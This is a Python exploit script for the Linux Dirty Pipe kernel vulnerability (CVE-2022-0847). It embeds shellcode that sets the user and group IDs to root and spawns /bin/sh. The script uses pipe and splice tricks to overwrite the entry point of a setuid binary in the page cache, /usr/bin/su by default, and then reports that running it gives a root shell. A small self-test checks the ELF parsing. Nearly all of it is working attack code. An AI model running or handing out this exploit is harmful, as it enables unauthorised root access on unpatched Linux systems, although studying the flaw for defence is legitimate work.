#!/usr/bin/env python3
from __future__ import annotations

import fcntl
import os
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import common

PAGE_SIZE = 4096
F_GETPIPE_SZ = 1032

SHELLCODE = (
    b"\x48\x31\xff"
    b"\x48\x31\xc0\xb0\x69\x0f\x05"
    b"\x48\x31\xc0\xb0\x6a\x0f\x05"
    b"\x48\x31\xd2"
    b"\x48\xbb/bin/sh\x00"
    b"\x53"
    b"\x48\x89\xe7"
    b"\x48\x31\xf6"
    b"\x48\x31\xc0\xb0\x3b\x0f\x05"
)

def entry_point_file_offset(elf_bytes: bytes) -> int:
    e_entry = struct.unpack_from("<Q", elf_bytes, 0x18)[0]
    e_phoff = struct.unpack_from("<Q", elf_bytes, 0x20)[0]
    e_phentsize = struct.unpack_from("<H", elf_bytes, 0x36)[0]
    e_phnum = struct.unpack_from("<H", elf_bytes, 0x38)[0]
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        p_type, p_flags = struct.unpack_from("<II", elf_bytes, off)
        p_offset, p_vaddr = struct.unpack_from("<QQ", elf_bytes, off + 8)
        p_filesz = struct.unpack_from("<Q", elf_bytes, off + 0x20)[0]
        if p_type == 1 and p_vaddr <= e_entry < p_vaddr + p_filesz:
            return p_offset + (e_entry - p_vaddr)
    raise RuntimeError("entry point not within any PT_LOAD segment")

def splice(fdsrc: int, fddst: int, count: int, off_src: int) -> int:
    if hasattr(os, "splice"):
        return os.splice(fdsrc, fddst, count, offset_src=off_src)
    import ctypes

    libc = common.load_libc()
    loff = ctypes.c_longlong(off_src)
    ret = libc.splice(fdsrc, ctypes.byref(loff), fddst, None, count, 0)
    if ret < 0:
        raise OSError(ctypes.get_errno(), "splice")
    return ret

def drain(fd: int, n: int) -> None:
    while n > 0:
        chunk = os.read(fd, n)
        if not chunk:
            return
        n -= len(chunk)

def set_can_merge(pipe_wr: int, pipe_rd: int) -> int:
    try:
        psize = fcntl.fcntl(pipe_wr, F_GETPIPE_SZ)
    except OSError:
        psize = PAGE_SIZE
    os.write(pipe_wr, b"\x00" * psize)
    drain(pipe_rd, psize)
    return psize

def patch(target: str) -> int:
    fd = os.open(target, os.O_RDONLY)
    try:
        header = os.read(fd, PAGE_SIZE)
        off = entry_point_file_offset(header)
        pipe_rd, pipe_wr = os.pipe()
        try:
            set_can_merge(pipe_wr, pipe_rd)
            written = 0
            while written < len(SHELLCODE):

                room_in_page = PAGE_SIZE - (off % PAGE_SIZE)
                n = min(room_in_page, len(SHELLCODE) - written)
                os.lseek(fd, off, os.SEEK_SET)
                splice(fd, pipe_wr, 1, off)
                os.write(pipe_wr, SHELLCODE[written:written + n])
                drain(pipe_rd, 1 + n)
                written += n
                off += n
            return written
        finally:
            os.close(pipe_rd)
            os.close(pipe_wr)
    finally:
        os.close(fd)

def main() -> int:
    if "--selftest" in sys.argv:
        common.info("dirtypipe.py selftest OK")

        sample = bytearray(64)
        sample[0:4] = b"\x7fELF"
        sample[4] = 2
        sample[5] = 1

        struct.pack_into("<Q", sample, 0x18, 0x400100)
        struct.pack_into("<Q", sample, 0x20, 0x40)
        struct.pack_into("<H", sample, 0x36, 0x38)
        struct.pack_into("<H", sample, 0x38, 1)
        ph = bytearray(0x38)
        struct.pack_into("<II", ph, 0, 1, 5)
        struct.pack_into("<QQ", ph, 8, 0, 0x400000)
        struct.pack_into("<Q", ph, 0x20, 0x1000)
        sample += ph
        off = entry_point_file_offset(bytes(sample))
        assert off == 0x100, off

        o = 4080
        chunks = []
        left = len(SHELLCODE)
        while left > 0:
            n = min(PAGE_SIZE - (o % PAGE_SIZE), left)
            chunks.append(n)
            left -= n
            o += n
        assert chunks == [16, 28], chunks
        common.good(f"entry offset parse OK ({off:#x}); chunking OK {chunks}; "
                    f"shellcode {len(SHELLCODE)} bytes")
        return 0

    common.linux_only()
    target = "/usr/bin/su"
    for i, a in enumerate(sys.argv):
        if a == "--target" and i + 1 < len(sys.argv):
            target = sys.argv[i + 1]
    common.info(f"patching {target} page cache (CVE-2022-0847)")
    try:
        n = patch(target)
    except Exception as e:
        common.die(f"patch failed: {e}")
    common.good(f"patched {n} bytes at entry point — run `{target}` for a root shell")
    print(f"OK {target}")
    return 0

if __name__ == "__main__":
    sys.exit(main())
